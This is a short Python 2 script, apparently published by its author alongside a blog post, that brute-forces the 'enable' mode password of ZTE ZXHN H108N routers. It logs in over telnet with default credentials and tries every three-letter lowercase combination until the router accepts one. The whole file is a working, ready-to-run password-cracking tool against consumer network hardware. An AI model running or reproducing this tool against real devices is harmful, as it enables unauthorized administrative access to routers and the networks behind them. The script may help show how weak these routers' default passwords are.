#!/usr/bin/env python
# Hacking Enable Mode Password
# Jalal Sela (Ligeti)

import telnetlib
import time
from sys import stdout
import itertools
import string
import argparse

def main():
    #Getting the argments
    progInfo = 'This is a brute-force tool build to crack the ZTE ZXHN H108N enable mode password. For more information, check: https://jalalsela.com/hacking-zxhn-h108n-router/'
    footer = 'Create by: Jalal Sela (Ligeti)'

    parser = argparse.ArgumentParser(description = progInfo, epilog=footer)
    #group = parser.add_mutually_exclusive_group()
    parser.add_argument('-a', '--addr', help='The IP address of ZTE AP (default: 192.168.1.1)', default='192.168.1.1')
    parser.add_argument('-u', '--user',  help='Username to use (default: root)', default='root')
    parser.add_argument('-p', '--password',  help='Telnet password to use (default: public)', default='public')
    
    args = parser.parse_args()

    print 'Address: ' + args.addr
    print 'Username: ' + args.user
    print 'Telnet Password: ' + args.password

    password = []
    connection = telnetlib.Telnet()
    print 'Connecting to router'
    connection.open(args.addr)
    print 'Connecting to CLI'
    chk = connection.read_until('Username:')
    connection.write(args.user + '\n')
    chk = connection.read_until('Password:')
    connection.write(args.password + '\n')
    chk = connection.read_until('CLI>')
    print 'Generating wordlist'
    wordlist = itertools.product(string.lowercase, repeat=3)

    s_time = time.ctime(time.time())
    print 'Started: ' + s_time

    for word in wordlist:
        password.append(''.join(word))

    print 'Attacking...'
    index = 0
        
    while (index < len(password)):
        connection.write('enable\n')
        chk = connection.read_until('Password:')
        for i in range(0, 3):
            print 'Test %d: %s'%(index, password[index])
            stdout.flush()
            connection.write(password[index] + '\n')
            chk = connection.read_until('Password:', 1)
            
            if ('Bad' not in chk):
                print '\n---------------------\nHacked: ' + password[index]
                print 'Started: ' + s_time
                f_time = time.ctime(time.time())
                print 'Finished: ' + f_time 
                print '---------------------'
                exit()
            index += 1
if __name__=="__main__":
    main()
